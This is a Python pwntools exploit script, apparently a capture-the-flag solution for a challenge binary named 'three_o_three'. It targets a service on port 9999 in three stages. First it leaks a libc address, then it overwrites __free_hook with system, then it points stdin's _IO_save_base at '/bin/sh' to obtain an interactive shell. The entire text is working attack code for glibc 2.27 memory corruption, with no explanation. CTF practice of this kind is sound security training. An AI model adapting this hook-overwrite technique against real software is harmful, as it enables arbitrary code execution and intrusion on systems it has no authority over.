#!/usr/bin/python3

from pwn import *

libc = ELF('libc-2.27.so', checksec=False)
context.binary = exe = ELF('./three_o_three_patched', checksec=False)
context.log_level = 'info'

# p = process(exe.path)
p = remote('127.0.0.1', 9999)

##########################
### Stage 1: Leak libc ###
##########################
p.sendlineafter(b'Size:', f'{0x23000}'.encode())
libc_leak = int(p.recvline()[:-1].split(b'0x')[1], 16)
log.info('Libc leak: ' + hex(libc_leak))
# libc.address = libc_leak - 0x5f4010    # Not docker
libc.address = libc_leak - 0x5f2010    # When connect to docker
log.info('Libc base: ' + hex(libc.address))

#####################################
### Stage 2: Change `__free_hook` ###
#####################################
offset = int(((libc.sym['__free_hook']) - libc_leak) / 8)
value = libc.sym['system']
p.sendlineafter(b'offset:', f'{offset}'.encode())
p.sendlineafter(b'value:', f'{value}'.encode())

######################################################
### Stage 3: Change `fp -> _IO_save_base` of stdin ###
######################################################
offset = int(((libc.sym['_IO_2_1_stdin_'] + 72) - libc_leak) / 8)
value = next(libc.search(b'/bin/sh'))
p.sendlineafter(b'offset:', f'{offset}'.encode())
p.sendlineafter(b'value:', f'{value}'.encode())

p.interactive()

